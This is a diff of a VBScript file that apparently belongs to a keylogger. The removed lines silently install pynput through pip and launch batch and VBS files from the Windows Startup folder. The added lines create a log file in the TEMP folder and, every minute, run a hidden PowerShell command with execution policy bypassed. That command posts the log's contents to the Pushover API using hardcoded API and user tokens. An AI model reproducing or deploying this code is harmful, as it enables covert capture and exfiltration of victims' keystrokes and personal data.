@@ -1,28 +1,39 @@
 Set objShell = CreateObject("WScript.Shell")
 Set objFSO = CreateObject("Scripting.FileSystemObject")
-Dim objShell
 
 ' Define the TEMP folder path
-tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
+tempPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\new"
+If Not objFSO.FolderExists(tempPath) Then
+    objFSO.CreateFolder(tempPath)
+End If
+
 logFile = tempPath & "\log.txt"
 
-' Install pynput in the background
-objShell.Run "cmd /c ""pip install pynput""", 0, True
+' Create log.txt if it does not exist (only runs once)
+If Not objFSO.FileExists(logFile) Then
+    Set objFile = objFSO.CreateTextFile(logFile, True)
+    objFile.WriteLine "Log file created on: " & Now
+    objFile.Close
+End If
 
-' Define the path to the Python script in the TEMP directory
-pythonScript = tempPath & "\a.py"
+Do
+    ' Define PowerShell script (only this part loops)
+    psCommand = "powershell -ExecutionPolicy Bypass -NoProfile -Command " & _ 
+        """$API_TOKEN='a4mbuegdv65j65d9buc4bzxezrsf4w'; " & _ 
+        "$USER_KEY='u2m1rdameavmjmg6abkauqy6ejdqk7'; " & _ 
+        "$FILE_PATH=[System.IO.Path]::Combine($env:TEMP,'new','log.txt'); " & _ 
+        "if (-Not (Test-Path $FILE_PATH)) {exit}; " & _ 
+        "$MESSAGE = Get-Content $FILE_PATH -Raw; $MAX_LENGTH = 1024; " & _ 
+        "while ($MESSAGE.Length -gt 0) { " & _ 
+        "$CHUNK = $MESSAGE.Substring(0, [Math]::Min($MAX_LENGTH, $MESSAGE.Length)); " & _ 
+        "Invoke-RestMethod -Uri 'https://api.pushover.net:443/1/messages.json' " & _ 
+        "-Method Post -Body @{token=$API_TOKEN; user=$USER_KEY; message=$CHUNK}; " & _ 
+        "$MESSAGE = $MESSAGE.Substring($CHUNK.Length)}; exit"""
 
+    ' Run the PowerShell command (silent mode)
+    objShell.Run "cmd /c " & psCommand, 0, True
 
+    ' Wait for 1 minute (60,000 milliseconds)
+    WScript.Sleep 60000
 
-Set objShell = CreateObject("WScript.Shell")
-
-' Get the Startup folder path
-StartupFolder = objShell.SpecialFolders("Startup")
-
-' Run file2.bat from the Startup folder
-objShell.Run Chr(34) & StartupFolder & "\file2.bat" & Chr(34), 0, False
-
-' Run file.vbs from the Startup folder
-objShell.Run Chr(34) & StartupFolder & "\file.vbs" & Chr(34), 0, False
-
-Set objShell = Nothing
+Loop
